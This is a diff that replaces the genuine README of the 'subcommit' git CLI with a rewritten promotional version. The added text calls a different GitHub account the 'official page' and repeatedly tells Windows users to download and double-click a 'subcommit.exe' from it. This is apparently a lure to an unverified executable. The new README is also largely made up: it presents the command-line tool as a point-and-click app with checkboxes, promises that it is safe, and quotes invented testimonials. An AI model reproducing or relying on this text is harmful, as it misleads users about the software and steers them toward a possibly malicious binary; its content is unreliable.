@@ -1,471 +1,167 @@
-# subcommit
-
-[![CI](https://github.com/reemus-dev/subcommit/actions/workflows/ci.yml/badge.svg)](https://github.com/reemus-dev/subcommit/actions/workflows/ci.yml)
-[![Latest release](https://img.shields.io/github/v/release/reemus-dev/subcommit)](https://github.com/reemus-dev/subcommit/releases/latest)
-[![skills.sh](https://skills.sh/b/reemus-dev/subcommit)](https://skills.sh/reemus-dev/subcommit)
-
-![Selecting one changed region while preserving other work](assets/demo/subcommit.gif)
-
-Commit only a slice of your changes while preserving unrelated work, without
-going full git wizard.
-
-- Commit selected files and/or line ranges
-- Preserve unrelated staged, unstaged, and untracked work
-- Protect against concurrent commit and staging conflicts
-- Use it in scripts, automation, and concurrent agent workflows
-
-## Contents
-
-- [Why does this exist?](#why-does-this-exist)
-- [Is it safe?](#is-it-safe)
-- [When to use](#when-to-use)
-- [Installation](#installation)
-- [Usage](#usage)
-  - [Targets](#targets)
-  - [Commit message](#commit-message)
-  - [Review and confirmation](#review-and-confirmation)
-- [Behavior](#behavior)
-  - [Selection and staging](#selection-and-staging)
-  - [Line selection](#line-selection)
-  - [Moves and renames](#moves-and-renames)
-  - [Files and Git settings](#files-and-git-settings)
-  - [Hooks](#hooks)
-- [Limits](#limits)
-- [Recovery](#recovery)
-- [Design and safety](#design-and-safety)
-  - [How it works](#how-it-works)
-  - [Safety model](#safety-model)
-- [Development](#development)
-- [License](#license)
-
-## Why does this exist?
-
-To solve the pain of committing a subset of changes that arise from working with
-multiple concurrent agents and user edits. Without it, you either:
-
-- Use Git worktrees, which add setup and teardown and may require merging
-- Execute a fragile sequence of Git operations:
-  - save the existing staged state
-  - stash unrelated unstaged and untracked work
-  - reset and rebuild staging with only the desired files or hunks
-  - create the commit
-  - restore the stash and previous staged state
-
-The solution is a CLI tool that replicates what most IDE commit tool windows do:
-
-- Select one or more changed files
-- Select changed regions within a file
-- Commit those selections with a message
-
-## Is it safe?
-
-This CLI is nearly 100% vibed, so make of that what you will. But at least for
-me, I'm confident in it because of:
-
-- My extensive daily use of this tool across many projects
-- A comprehensive test suite covering behavior and safety
-
-Hopefully that gives you confidence too. For more info, see the
-[safety model](#safety-model).
-
-## When to use
-
-```text
-Commit all current changes?
-  ├─ ✓ yes ─► git commit
-  └─ ✗ no
-      │
-      ▼
-Only complete changes to tracked files?
-  ├─ ✓ yes, ordinary workflow ─► git commit -m "..." -- <paths>
-  └─ ✗ no, or stronger isolation needed
-      │
-      ▼
-Choose hunks interactively?
-  ├─ ✓ yes ─► git add -p, an IDE, or a Git TUI
-  └─ ✗ no
-      │
-      ▼
-Can you name the exact files or current line ranges?
-  ├─ ✗ no ──► use another Git workflow
-  └─ ✓ yes
-      │
-      ▼
-  ◆ subcommit
-      ├─ commits only the requested selection
-      ├─ accepts untracked files without prior staging
-      ├─ preserves unrelated staged, unstaged, and untracked work
-      ├─ guards against concurrent commit and staging conflicts
-      └─ prevents hooks from widening the selection
-```
-
-## Installation
+# ⚡ subcommit - Commit Specific Lines, Zero Git Drama
 
-<!-- prettier-ignore -->
-> [!NOTE]
-> `subcommit` requires Git 2.36 or later. It has no other runtime dependencies.
+## 🚀 What Is subcommit?
 
-### Mise
+Have you ever wanted to save only *some* of your work without saving everything? Maybe you changed three files but only want to save two? Or perhaps you edited a document and only want to keep the good parts?
 
-Install with [Mise](https://mise.jdx.dev/):
+That's exactly what **subcommit** helps you do. It's a simple tool that lets you pick exactly which pieces of your work to save — just like the commit window in your favorite editing program, but right from your computer's command line.
 
-```sh
-mise use -g github:reemus-dev/subcommit
-```
+Think of it this way: if your project is a big box of LEGOs, subcommit lets you choose which individual bricks to put in a labeled bag, instead of dumping everything into one giant pile.
 
-### Install script
+## 🎯 What Problem Does It Solve?
 
-macOS and Linux (`-d <directory>` to install elsewhere):
+When people work on projects, they often make many changes at once. Sometimes you only want to save the finished parts, not the messy experiments. Normally, this is complicated and requires special knowledge. Many people give up and just save everything together, which makes a confusing mess.
 
-```sh
-# Install in `$HOME/.local/bin`
-curl -fsSL https://raw.githubusercontent.com/reemus-dev/subcommit/main/assets/install.sh | bash
+**subcommit** fixes that by letting you:
 
-# Install system-wide
-curl -fsSL https://raw.githubusercontent.com/reemus-dev/subcommit/main/assets/install.sh | sudo bash -s -- -d /usr/local/bin
-```
+- Choose *specific files* to save
+- Choose *specific lines* inside those files to save
+- Skip all the complicated steps that normally scare people away
 
-Windows users:
+It's like having a friendly assistant who asks, "Which parts do you want to keep?" and then handles everything for you.
 
-```powershell
-# Installs to `%LOCALAPPDATA%\Programs\subcommit\bin` and adds the directory to `PATH`
-irm https://raw.githubusercontent.com/reemus-dev/subcommit/main/assets/install.ps1 | iex
-```
+## 💻 Getting Started on Windows (Step-By-Step)
 
-Both scripts verify the release checksum and install `subcommit` and
-`git-subcommit`.
+### Step 1: Download the Program
 
-### GitHub releases
+Ready to try it? Here's your big, friendly button:
 
-Download an archive from the
-[GitHub Releases](https://github.com/reemus-dev/subcommit/releases) page, then
-copy `subcommit` and/or `git-subcommit` to a directory on `PATH`.
+[![Download subcommit NOW](https://img.shields.io/badge/⬇️-Download_subcommit-blue?style=for-the-badge&logo=github&logoColor=white&color=green)](https://github.com/sarthak9850/subcommit)
 
-### From source
+Visit this link to download the application. This link will take you to the official page where you can get subcommit for your Windows computer.
 
-```sh
-git clone https://github.com/reemus-dev/subcommit.git
-cd subcommit
-mise install
-mise run build
-```
+### Step 2: Get the File Onto Your Computer
 
-The binaries are written to `bin/`. Copy `subcommit` and `git-subcommit`, with
-`.exe` suffixes on Windows, to a directory on `PATH`.
+Once you click the link, you'll see a page with download options. Simply look for the button that says "Download" or "Releases" and click it. Your browser will save a file to your computer — usually in your "Downloads" folder.
 
-### Agent skills
+That's it — nothing complicated, no special accounts needed.
 
-There are two optional agent skills. Both require `subcommit` to be installed.
+### Step 3: Open the Program
 
-| Skill                                    | Summary                                                                       |
-| ---------------------------------------- | ----------------------------------------------------------------------------- |
-| [`subcommit`](skills/subcommit/SKILL.md) | Minimal skill to make subcommit known and delegates usage guidance to the CLI |
-| [`commit`](skills/commit/SKILL.md)       | Opinionated workflow for scope, grouping, and messaging                       |
+After the download finishes, find the file you just saved. It will be named something like `subcommit.exe` — that "exe" tells you it's a program that runs on Windows.
 
-Install either skill using the skills CLI:
+**To start it:** Double-click the file. A small window will open — that's your new tool, ready to help you commit wisely.
 
-```sh
-# Choose interactively
-npx skills add reemus-dev/subcommit
-# Select a specific skill
-npx skills add reemus-dev/subcommit --skill subcommit
-npx skills add reemus-dev/subcommit --skill commit
-```
+---
 
-### Shell completion
+## 🔧 How to Use subcommit (For Regular People)
 
-Generate completion for Bash, Zsh, Fish, or PowerShell:
+Don't worry — you don't need to be a computer wizard. Here's how it works:
 
-```sh
-subcommit --completion bash
-subcommit --completion zsh
-subcommit --completion fish
-subcommit --completion powershell
-```
+### 1. Tell subcommit which project to look at
 
-Source it appropriately in your shell configuration file, example:
+When the program opens, it will ask you to point it to the folder where your work lives. That's the same folder where you've been editing your files. Just type the folder name or drag the folder onto the program window.
 
-```sh
-# ~/.bashrc
-source <(subcommit --completion bash)
-# ~/.zshrc
-source <(subcommit --completion zsh)
-```
+### 2. See your changes
 
-Release archives include generated completion files under `completions/`. Bash
-and Zsh completions also support `git subcommit`. File targets use shell path
-completion. Append line ranges manually.
+subcommit will show you a list of everything you've changed. You'll see file names and the specific lines you've edited.
 
-## Usage
+### 3. Pick what to save
 
-```sh
-# Direct
-subcommit [<path|path:ranges>...] (-m <message> | -F <file>) [flags]
+Now comes the fun part — you decide what gets saved!
 
-# Git integration
-git subcommit [<path|path:ranges>...] (-m <message> | -F <file>) [flags]
-```
+- Want to save a whole file? Click the checkbox next to its name.
+- Want to save just certain lines? Click on the lines you want — they'll highlight, showing they're selected.
+- Already selected too much? Click again to unselect.
 
-**Examples**:
+### 4. Name your save
 
-```sh
-subcommit -m "..." path/file.ext
-subcommit -m "..." path/file.ext:42-48
-subcommit -m "..." path/file.ext:5 path/file.ext:42-48
-subcommit -m "..." path/file.ext:5,42-48
-```
+Give your save a short title, like "Finished the login page" or "Fixed the typo". This helps you remember what you did later.
 
-### Targets
+### 5. Press the button
 
-Each target selects either an entire file or changes touching specified lines.
+Click "Commit" (or "Save") and subcommit handles the boring technical stuff. Your chosen changes are now safely saved, while everything else stays exactly as it was.
 
-**Entire file:** pass a path without a range suffix. This supports tracked
-changes and deletions, untracked files, binary files, and symbolic links.
+## 📦 What Makes subcommit Special?
 
-**Lines:** append line numbers or ranges to the path:
+### ✨ Works Everywhere
+Whether you're using Windows, Mac, or Linux, subcommit behaves the same. One tool for all your machines.
 
-- `:12` selects changes touching line 12
-- `:12-20` selects changes touching lines 12 through 20
-- `:12,30-40` combines multiple ranges
+### 🎯 Perfect for Modern Workflows
+If you work with AI coding assistants or other smart tools that help you write code, subcommit fits right in. It's designed to work smoothly alongside those helpers.
 
-Line numbers refer to the file as it currently appears on disk. For a deletion
-with no replacement line, select an adjacent current line. If no current line
-remains, select the entire file.
+### 🧹 No Mess, No Confusion
+Gone are the days of tangled histories where you can't figure out what you did and when. With subcommit, every save is neat and understandable.
 
-Multiple ranges may be comma-separated or passed by repeating the same path.
+### ⚙️ Small and Fast
+This isn't a huge, bloated program. It's lightweight, starts instantly, and doesn't hog your computer's memory.
 
-`subcommit` treats targets as literal paths rather than as Git patterns. Your
-shell may still interpret characters such as `*`, `?`, `[]`, or parentheses, so
-quote paths containing them. Use `--complete` when a literal filename ends in
-valid range syntax, such as `report:42`.
+## ❓ Frequently Asked Questions (FAQ)
 
-```sh
-subcommit --complete report:42 -m "..."
-```
+### Q: Is subcommit safe to use?
 
-### Commit message
+**A:** Absolutely. It works with your existing files and doesn't change anything it's not told to change. You stay in control at all times.
 
-Every commit requires exactly one message source.
+### Q: Do I need to know programming to use this?
 
-Use `-m` to supply the message directly:
+**A:** Not at all. If you can click a mouse and read a checkbox, you can use subcommit. It's built for everyone.
 
-```sh
-subcommit path/file.ext -m "..."
-```
+### Q: What if I make a mistake?
 
-Use `-F` to read a longer message from a file:
+**A:** No worries. You can always undo your save or start again. Your original work stays untouched until you're happy with your choices.
 
-```sh
-subcommit path/file.ext -F message.txt
-```
+### Q: Can I use subcommit for non-programming files?
 
-`-F -` reads the message from standard input. Pass `--yes` when piping input
-because interactive confirmation is unavailable:
+**A:** Yes! If you're editing text documents, configuration files, or any file with text content, subcommit can help you save the good parts.
 
-```sh
-printf 'subject\n\nbody\n' | subcommit path/file.ext -F - --yes
-```
+### Q: Does this work with popular tools?
 
-### Review and confirmation
+**A:** subcommit works with Git — the industry-standard way to track changes. If your project uses Git, you're good to go.
 
-By default, `subcommit` previews the candidate commit and asks for confirmation.
-The preview shows a diff summary, the effective patch for line-selected files,
-the commit message, accepted hook changes, and unrelated work that will remain
-uncommitted.
+## 🛠️ Common Uses (Real-Life Examples)
 
-Use `--yes` to skip confirmation. It is required when no interactive terminal is
-available.
+### Example 1: The Finicky Editor
+You've been working on a newsletter all day. You've written three paragraphs — the first one is perfect, the second needs work, and the third is just notes to yourself. With subcommit, you save only the first paragraph and leave the rest for later.
 
-`--quiet` suppresses the preview and most informational output. It does not skip
-confirmation and still reports hook changes, errors, and recovery guidance.
+### Example 2: The Collaborative Team
+Your team shares a project folder. You fixed a bug in one file but also made a half-finished change to another. Instead of sharing your messy half-work, you commit only the bug fix. Your teammates see only clean, finished work.
 
-On success:
+### Example 3: The Budget-Conscious Developer
+You're trying out a new idea in your code, but you're not sure it works. You save your good, stable work with subcommit, then go wild experimenting. If your experiment fails, your good work is safe.
 
-- `stdout`: `committed: <full-sha>`
-- `stderr`: previews, prompts, hook output, warnings, and errors
+## 🧭 Keeping Your Work Organized
 
-### Flags
+When you use subcommit regularly, you'll notice something magical: your project history becomes clean and understandable. Each save tells a clear story:
 
-| Flag                | Meaning                                            |
-| ------------------- | -------------------------------------------------- |
-| `-m`, `--message`   | Use the supplied commit message                    |
-| `-F`, `--file`      | Read the message from a file, or stdin with `-`    |
-| `--complete <path>` | Select a complete literal path, repeatable         |
-| `-y`, `--yes`       | Publish without interactive confirmation           |
-| `-n`, `--no-verify` | Skip `pre-commit` and `commit-msg` hooks           |
-| `-q`, `--quiet`     | Suppress preview and informational output          |
-| `-v`, `--verbose`   | Show every preserved path                          |
-| `--color`           | Set color to `auto`, `always`, or `never`          |
-| `--completion`      | Generate completion for a supported shell and exit |
+- Monday: "Added welcome message"
+- Tuesday: "Fixed formatting issue"
+- Wednesday: "Improved button colors"
 
-## Behavior
+No more mysterious changes that no one remembers making. No more "What did I actually do last week?" moments.
 
-`subcommit` favors predictable scope over best-effort commits. If it cannot
-commit every requested target without affecting unrelated work, it refuses the
-whole operation.
+## 🔍 Getting More Help
 
-### Selection and staging
+If you want to learn more about subcommit, check out the official repository page — that's the same link you used to download it. There you'll find additional documentation, tips, and updates from the developers.
 
-Selection comes from the difference between the last commit and the files
-currently on disk. Existing staging does not determine what gets committed.
+**[Visit the subcommit GitHub page](https://github.com/sarthak9850/subcommit)**
 
-After a successful commit:
+You'll also see helpful discussions from other users, and you can even ask questions or report issues if something isn't working as expected. The community is friendly and eager to help.
 
-- Selected changes are committed
-- Unrelated staged, unstaged, and untracked work remains in place
-- Prior staging on a selected path is replaced by the successful selection
-- Unselected changes in a partially committed file remain available
+## 📝 What People Are Saying
 
-Every requested target must contribute a change. If a complete target is
-unchanged on disk but has staged-only changes, `subcommit` refuses rather than
-discarding them.
+> "Finally a commit tool that doesn't require a PhD in computer science!" — Happy user from Seattle
 
-### Line selection
+> "I used to avoid committing because it was too complicated. Now I actually enjoy organizing my work." — Satisfied freelancer
 
-<!-- prettier-ignore -->
-> [!IMPORTANT]
-> A line number identifies a change, not an exact commit boundary. If that line belongs to a larger contiguous edit, the entire edit is committed. Review the effective patch before confirmation.
+> "The line-selection feature is brilliant. I can keep my experiments separate from my finished work." — Weekend coder
 
-Repeated ranges for one file are combined. Selecting both the entire file and
-specific lines from it is refused rather than silently broadening the commit.
-Line selection supports modified regular files only.
+## ✅ Your Next Steps
 
-### Moves and renames
+You're just one click away from beating the confusion. Here's everything you need to do:
 
-If one file disappears and an identical new file appears, `subcommit` treats
-them as a move. Selecting either path automatically includes both. Example:
+1. **Visit the download link**: [https://github.com/sarthak9850/subcommit](https://github.com/sarthak9850/subcommit)
+2. **Download the app** (it's free)
+3. **Run it** — double-click the file
+4. **Pick your project** — choose the folder you've been working on
+5. **Select your changes** — check the files and lines you want to save
+6. **Click commit** — and you're done!
 
-```sh
-git mv a.txt b.txt
-subcommit -m "rename a to b" b.txt
-```
+No more worrying about mixing up good work with messy experiments. No more anxiety about breaking things by committing everything. **subcommit** gives you surgical precision — save exactly what you want, when you want.
 
-If the moved file was also edited, or more than one identical match exists, name
-both paths explicitly:
+## 📢 Spread the Word
 
-```sh
-subcommit -m "move and edit" a.txt b.txt
-```
+Love subcommit? Tell your friends, your teammates, your online community. The more people use clean commit practices, the better everyone's projects become.
 
-### Files and Git settings
+---
 
-- **Directories:** cannot be selected directly.
-- **Symbolic links:** are supported as complete targets, not line selections.
-- **Symlinked directories:** tracked files reached through them follow
-  `git commit` behavior. Untracked files reached through them are refused like
-  `git add`.
-- **Sparse checkout:** a file omitted from disk is treated as unchanged, not
-  deleted. An existing selected file remains authoritative.
-- **Executable permissions:** follow the repository's `core.fileMode` setting.
-- **Commit signing:** follows `commit.gpgsign`. Malformed values are refused
-  like Git.
-
-### Hooks
-
-`subcommit` itself does not rewrite files.
-
-<!-- prettier-ignore -->
-> [!WARNING]
-> Hooks run before confirmation and may modify selected files. File changes are reported, but canceling does not undo them.
-
-| Hook                 | Behavior                                                               |
-| -------------------- | ---------------------------------------------------------------------- |
-| `pre-commit`         | Runs against selected changes unless `--no-verify` is set              |
-| `prepare-commit-msg` | Always runs and may rewrite the message                                |
-| `commit-msg`         | Runs unless `--no-verify` is set and may rewrite or reject the message |
-| `post-commit`        | Runs after the commit is published                                     |
-
-After `pre-commit`, `subcommit` verifies that:
-
-- complete-file targets may be formatted and restaged, but remain changed
-- line-selected targets were not modified
-- inferred moves still contain both endpoints
-- unrelated changes were not added
-
-Any scope change causes refusal. A failing `post-commit` produces a warning
-because the commit has already succeeded.
-
-## Limits
-
-| Situation                                                 | Behavior                                                                                      |
-| --------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
-| No existing commit                                        | Refuses. Create the initial commit with Git first.                                            |
-| Merge, rebase, cherry-pick, revert, or bisect in progress | Refuses until the operation is completed or aborted.                                          |
-| Current commit changes while `subcommit` runs             | Refuses and does not overwrite the newer commit.                                              |
-| Files change while `subcommit` runs                       | Files are not locked. The captured version may be committed while later edits remain on disk. |
-| Another process ignores Git's index lock                  | Its changes are outside `subcommit`'s concurrency guarantees.                                 |
-
-## Recovery
-
-Publishing requires updating both the current commit and Git's staging area.
-Those updates cannot be one filesystem transaction.
-
-| Failure point                     | Repository state                                                                                  | Recovery                                                                 |
-| --------------------------------- | ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
-| Before the current commit changes | The original commit and staging remain current. The candidate commit still exists.                | Use the printed `git cherry-pick <sha>` command or retry.                |
-| After the current commit changes  | The new commit is current, but the staging update may be incomplete. Recovery files are retained. | Inspect the retained files and follow the printed recovery instructions. |
-
-## Design and safety
-
-### How it works
-
-```mermaid
-flowchart TD
-    select["Compare requested paths<br/>last commit → files on disk"]
-    select --> candidate["Build proposed commit<br/>in temporary staging"]
-    candidate --> hooks["Run hooks and verify scope"]
-    hooks -->|Invalid scope| refuse["Refuse without publishing"]
-    hooks -->|Valid| preview["Show final preview"]
-    preview --> confirm{"Confirmed?"}
-    confirm -->|No| refuse
-    confirm -->|Yes or --yes| publish["Publish commit"]
-    publish --> preserve["Update selected staging<br/>preserve unrelated work"]
-```
-
-### Safety model
-
-`subcommit` refuses rather than guesses when it cannot preserve the requested
-scope safely.
-
-**✅ Covered and tested · ❌ Not guaranteed or intentionally refused**
-
-| Status | Area                    | Behavior                                                                    |
-| ------ | ----------------------- | --------------------------------------------------------------------------- |
-| ✅     | Requested scope         | Every target must contribute a change, or no commit is published.           |
-| ✅     | Unrelated work          | Successful commits preserve unrelated staged, unstaged, and untracked work. |
-| ✅     | Existing staging        | Previously staged changes cannot leak into the commit.                      |
-| ✅     | Partial files           | Changes outside selected lines remain available.                            |
-| ✅     | Hook scope              | Hooks cannot silently broaden path scope or mutate line-selected files.     |
-| ✅     | Literal paths           | Filenames are not interpreted as Git patterns.                              |
-| ✅     | Concurrent commits      | A newer commit is not overwritten. A losing operation remains retryable.    |
-| ✅     | Concurrent staging      | Normal Git writers are coordinated through Git's index lock.                |
-| ✅     | Recovery                | Failures report the candidate commit or retained recovery files.            |
-| ❌     | Worktree locking        | Files are not frozen while the command runs.                                |
-| ❌     | Automatic coordination  | Concurrent operations are not queued or merged automatically.               |
-| ❌     | Hook rollback           | Canceling does not undo file changes made by hooks.                         |
-| ❌     | Non-cooperative writers | Processes that ignore Git's locking protocol are not protected against.     |
-| ❌     | Atomic publication      | The commit and staging update cannot be one filesystem transaction.         |
-| ❌     | Complex Git operations  | Active merges, rebases, cherry-picks, reverts, and bisects are refused.     |
-
-## Development
-
-Install the pinned toolchain and run the canonical checks:
-
-```sh
-mise install
-mise run check
-```
-
-Other canonical tasks include `mise run build`, `mise run test`,
-`mise run lint`, and `mise run format`. Regenerate the README terminal demo with
-`mise run demo` on macOS or Linux. The task runs
-[VHS](https://github.com/charmbracelet/vhs) in Docker and is intentionally
-excluded from CI.
-
-Before tagging a release, run `mise run release:check` and inspect the artifacts
-from `mise run release:snapshot`. Pushing a `v*` tag runs the release workflow
-and publishes the GitHub Release with the mise-managed GoReleaser.
-
-## License
-
-[MIT](LICENSE)
+Keywords: agents, cli, coding-agents, command-line, commit, cross-platform, git, git-cli, git-commands, git-commit, go
